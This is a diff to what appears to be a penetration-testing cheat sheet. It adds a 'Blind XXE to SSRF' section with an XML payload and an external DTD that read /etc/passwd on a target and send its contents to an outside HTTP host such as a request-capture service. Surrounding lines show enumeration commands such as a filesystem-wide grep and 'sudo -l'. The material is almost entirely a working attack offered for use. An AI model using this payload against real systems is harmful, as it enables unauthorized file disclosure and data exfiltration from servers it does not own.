@@ -10,3 +10,19 @@ grep -r "STRING" / 2>/dev/null
 #check SUDO privileges/rights
 sudo -l
 
+
+## Blind XXE to SSRF
+
+*ON TARGET*
+
+<?xml version="1.0"?>
+<!DOCTYPE foo SYSTEM "*HOST ADDRESS OF DTD FILE (preferably on github)*">
+<foo>&e1;</foo>
+
+*INSIDE DTD FILE*
+<!ENTITY % p1 SYSTEM "file:///etc/passwd">
+<!ENTITY % p2 "<!ENTITY e1 SYSTEM '*RANDOM HTTP HOST (like https://requestbin.com/)*/%p1;'>">
+%p2;
+
+
+
